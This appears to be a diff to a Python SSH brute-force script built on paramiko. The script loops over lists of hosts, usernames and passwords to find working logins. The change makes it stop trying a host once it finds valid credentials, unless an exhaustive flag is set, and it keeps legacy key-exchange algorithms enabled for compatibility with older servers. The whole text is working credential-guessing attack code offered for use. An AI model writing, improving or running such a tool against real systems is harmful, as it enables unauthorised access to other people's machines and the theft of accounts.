@@ -5,6 +5,7 @@ import sys
 import signal
 from itertools import product
 from paramiko import SSHClient, AutoAddPolicy
+from collections import defaultdict
 
 # Set legacy algorithms for compatibility
 paramiko.transport._preferred_kex = ['diffie-hellman-group14-sha1']
@@ -113,9 +114,31 @@ def main():
 
     print(f"[INFO] Loaded {len(hosts)} hosts, {len(users)} users, {len(pwds)} passwords")
 
+    host_success = set()
+    user_success_per_host = set()
+
     for host in hosts:
-        for username, password in product(users, pwds):
-            try_ssh(host, username, password, verbose=args.verbose)
+        if host in host_success:
+            continue  # Already found valid creds for this host
+
+        for username in users:
+            if (host, username) in user_success_per_host:
+                continue  # Already succeeded for this user@host
+
+            for password in pwds:
+                success = try_ssh(host, username, password, verbose=args.verbose)
+                if success:
+                    user_success_per_host.add((host, username))
+
+                    if not args.exhaustive:
+                        host_success.add(host)
+                        break  # Exit password loop
+
+            if not args.exhaustive and host in host_success:
+                break  # Exit user loop
+
+        if not args.exhaustive and host in host_success:
+            continue  # Move on to next host
 
 # Entry point
 if __name__ == "__main__":
